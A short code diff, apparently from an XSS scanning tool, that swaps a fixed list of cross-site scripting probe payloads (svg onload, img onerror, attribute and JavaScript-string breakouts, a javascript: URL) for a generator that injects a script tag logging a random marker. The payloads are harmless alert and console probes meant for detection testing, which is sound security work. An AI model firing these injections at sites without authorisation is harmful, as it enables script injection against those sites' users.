@@ -1,19 +1,8 @@
-PAYLOADS = {
-    "html": [
-        "<svg/onload=alert(1)>",
-        "<img src=x onerror=alert(1)>"
-    ],
-    "attr": [
-        "\" onmouseover=alert(1) x=\"",
-    ],
-    "js": [
-        "';alert(1);//",
-        "\";alert(1);//"
-    ],
-    "url": [
-        "javascript:alert(1)"
-    ]
-}
+import uuid
 
-def get_payload(context):
-    return PAYLOADS.get(context, PAYLOADS["html"])[0]
+def generate_payload():
+    marker = f"XSSPECTOR_{uuid.uuid4().hex[:8]}"
+
+    payload = f"'><script>console.log('{marker}')</script>"
+
+    return payload, marker
